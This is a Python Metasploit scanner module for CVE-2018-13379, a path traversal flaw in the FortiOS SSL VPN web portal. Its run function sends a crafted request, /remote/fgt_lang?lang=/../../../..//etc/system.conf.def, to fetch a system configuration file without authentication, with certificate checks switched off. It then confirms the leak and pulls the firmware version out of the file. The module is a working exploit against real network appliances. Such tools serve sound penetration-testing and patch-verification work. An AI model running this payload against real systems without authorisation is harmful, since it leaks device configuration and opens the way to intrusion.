#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module
import logging

# extra modules
dependencies_missing = False
try:
    import re
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except ImportError:
    dependencies_missing = True

# metadata
metadata = {
    "name": "FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests",
    "description": """
    A path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated attacker to download FortiOS system files through specially crafted HTTP resource requests.
    
    Affected Products:
       FortiOS 6.0 - 6.0.0 to 6.0.4
       FortiOS 5.6 - 5.6.3 to 5.6.7
       FortiOS 5.4 - 5.4.6 to 5.4.12
       (other branches and versions than above are not impacted)
       ONLY if the SSL VPN service (web-mode or tunnel-mode) is enabled.
    """,
    "authors": ["Tatam <tatam@protonmail.com>"],
    "date": "2018-07-06",
    "license": "MSF_LICENSE",
    "references": [
        {"type": "cve", "ref": "2018-13379"},
        {"type": "url", "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-13379"},
        {
            "type": "url",
            "ref": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379",
        },
        {"type": "url", "ref": "https://www.fortiguard.com/psirt/FG-IR-18-384"},
        {
            "type": "url",
            "ref": "https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf",
        },
    ],
    "type": "single_scanner",
    "rank": "normal",
    "options": {
        "RPORT": {
            "type": "port",
            "description": "The target port (TCP)",
            "required": True,
            "default": 4443,
        }
    },
    "service_name": "ssl/http",
}


def run(args):
    path = "/remote/fgt_lang?lang=/../../../../////////////////etc/system.conf.def"

    if dependencies_missing:
        module.log(
            "Module dependencies (requests) missing, cannot continue", level="error"
        )
        return False
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        res = requests.get(
            "https://{}:{}{}".format(args["rhost"], args["RPORT"], path), verify=False
        )
    except requests.exceptions.ConnectionError:
        # except:
        module.log(
            "Host {} on port {} cannot be reached".format(args["rhost"], args["RPORT"]),
            level="error",
        )
        return False

    # Vulnerable
    if res.status_code == 200 and "config-version=FGT" in res.text:
        module.log(
            "Host {} is vulnerable to CVE-2018-13379".format(args["rhost"]),
            level="good",
        )
        match = re.search("config-version=\S+-(\S+)", res.text)
        module.report_vuln(args["rhost"], "CVE-2018-13379")
        module.report_host(args["rhost"], os_name="FortiOS", os_sp=match.group(1))
        module.report_service(args["rhost"], port=args["RPORT"], proto="tcp")
        return True
    # Maybe vulnerable
    elif res.status_code == 200 and "config-version=FGT" not in res.text:
        module.log(
            "Host {} is maybe vulnerable to CVE-2018-13379 or protected by a WAF".format(
                args["rhost"]
            ),
            level="warning",
        )
        return False
    # Patched or not vulnerable
    elif res.status_code == 404:
        module.log(
            "Host {} is not vulnerable to CVE-2018-13379, maybe seem patched or not a FortiGate device".format(
                args["rhost"]
            ),
            level="warning",
        )
        return False
    # Unknow but not vulnerable
    else:
        module.log(
            "Host {} is not vulnerable to CVE-2018-13379".format(args["rhost"]),
            level="error",
        )
        return False


if __name__ == "__main__":
    module.run(metadata, run)
